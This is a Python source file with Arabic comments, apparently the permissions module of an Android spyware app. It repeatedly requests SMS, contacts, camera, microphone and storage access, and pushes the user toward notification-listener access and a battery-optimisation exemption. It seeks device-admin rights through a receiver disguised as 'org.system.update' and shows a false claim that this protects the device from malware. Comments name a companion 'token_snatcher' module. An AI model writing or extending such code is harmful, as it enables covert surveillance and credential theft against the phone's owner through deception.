"""
core/permissions.py
وحدة منفصلة لإدارة طلبات الصلاحيات المختلفة (Android).
تستخدم لتجنب ازدحام الكود في monitor.py.
"""

import threading
import time
from jnius import autoclass
from android.permissions import request_permissions, check_permission, Permission
from android import mActivity

class PermissionManager:
    """
    مدير الصلاحيات: يطلب الصلاحيات اللازمة واحدة تلو الأخرى أو دفعة واحدة،
    ويعيد محاولة الطلب إذا رفض المستخدم.
    """

    # قائمة الصلاحيات الأساسية التي سيطلبها التطبيق
    BASIC_PERMISSIONS = [
        Permission.INTERNET,
        Permission.ACCESS_NETWORK_STATE,
        Permission.CAMERA,
        Permission.READ_EXTERNAL_STORAGE,
        Permission.WRITE_EXTERNAL_STORAGE,
        Permission.RECORD_AUDIO,
        Permission.READ_SMS,
        Permission.READ_CONTACTS,
    ]

    # صلاحيات إضافية يمكن طلبها لاحقاً (مثل القراءة الدقيقة للموقع)
    EXTRA_PERMISSIONS = [
        # Permission.ACCESS_FINE_LOCATION,
        # Permission.ACCESS_COARSE_LOCATION,
    ]

    def __init__(self, monitor=None):
        self.monitor = monitor  # اختياري، لتسجيل الأحداث
        self.all_granted = False

    def log(self, msg):
        if self.monitor:
            self.monitor.log(msg)
        else:
            print(f"[Permissions] {msg}")

    def request_basic_permissions(self, max_attempts=2):
        """طلب جميع الصلاحيات الأساسية دفعة واحدة، مع إعادة المحاولة إذا رفض البعض."""
        for attempt in range(max_attempts):
            self.log(f"Requesting basic permissions (attempt {attempt+1}/{max_attempts})...")
            request_permissions(self.BASIC_PERMISSIONS)
            time.sleep(2)  # انتظر رد المستخدم
            missing = [p for p in self.BASIC_PERMISSIONS if not check_permission(p)]
            if not missing:
                self.log("All basic permissions granted.")
                self.all_granted = True
                return True
            else:
                self.log(f"Missing permissions: {missing}")
                if attempt == max_attempts - 1:
                    self.log("Some permissions were denied. Continuing with available ones.")
                    return False
        return False

    def request_ignore_battery_optimizations(self):
        """طلب تجاهل تحسين البطارية (يفتح إعدادات النظام للمستخدم)."""
        try:
            PowerManager = autoclass('android.os.PowerManager')
            Settings = autoclass('android.provider.Settings')
            Intent = autoclass('android.content.Intent')
            pm = mActivity.getSystemService('power')
            package_name = mActivity.getPackageName()
            if not pm.isIgnoringBatteryOptimizations(package_name):
                intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                uri = autoclass('android.net.Uri').parse(f"package:{package_name}")
                intent.setData(uri)
                mActivity.startActivity(intent)
                self.log("Opened battery optimization settings. User must disable manually.")
                return True
            else:
                self.log("Already ignoring battery optimizations.")
                return True
        except Exception as e:
            self.log(f"Failed to request battery ignore: {e}")
            return False

    def request_device_admin(self):
        """طلب صلاحيات مدير الجهاز (Device Admin) - يفتح شاشة التنشيط."""
        try:
            DevicePolicyManager = autoclass('android.app.admin.DevicePolicyManager')
            ComponentName = autoclass('android.content.ComponentName')
            Intent = autoclass('android.content.Intent')
            dpm = mActivity.getSystemService('device_policy')
            admin_component = ComponentName(mActivity.getPackageName(), "org.system.update.AdminReceiver")
            if not dpm.isAdminActive(admin_component):
                intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin_component)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "مطلوب لحماية الجهاز من التطبيقات الضارة وإدارة قفل الشاشة.")
                mActivity.startActivity(intent)
                self.log("Opened device admin activation screen.")
                return False  # لم يتم التنشيط بعد، ينتظر المستخدم
            else:
                self.log("Device admin already active.")
                return True
        except Exception as e:
            self.log(f"Device admin request failed: {e}")
            return False

    def request_notification_listener(self):
        """توجيه المستخدم إلى إعدادات Notification Listener (يتم يدويًا)."""
        try:
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            mActivity.startActivity(intent)
            self.log("Opened notification listener settings. User must enable manually.")
            return True
        except Exception as e:
            self.log(f"Failed to open notification settings: {e}")
            return False

    def request_backup_permission(self):
        """صلاحية النسخ الاحتياطي (غير قابلة للطلب المباشر، نوجه المستخدم إلى الإعدادات)."""
        # لا توجد صلاحية محددة للنسخ الاحتياطي، ولكن يمكن توجيه المستخدم إلى إعدادات النسخ الاحتياطي.
        # سيتم التعامل معها داخل token_snatcher.py بشكل منفصل.
        self.log("Backup permission will be handled by TokenSnatcher module.")
        return True

    def request_all_optional(self):
        """طلب الصلاحيات الاختيارية (مثل الإشعارات، النسخ الاحتياطي، إلخ) في خلفية منفصلة."""
        threading.Thread(target=self._optional_requests, daemon=True).start()

    def _optional_requests(self):
        time.sleep(5)  # تأخير قليل بعد بدء التطبيق
        self.request_ignore_battery_optimizations()
        time.sleep(2)
        self.request_device_admin()
        time.sleep(2)
        self.request_notification_listener()
        # backup permission سيتم طلبها عند الحاجة في token_snatcher

# دالة مساعدة للاستخدام السريع
def request_all_permissions(monitor=None):
    pm = PermissionManager(monitor)
    pm.request_basic_permissions()
    pm.request_all_optional()
    return pm
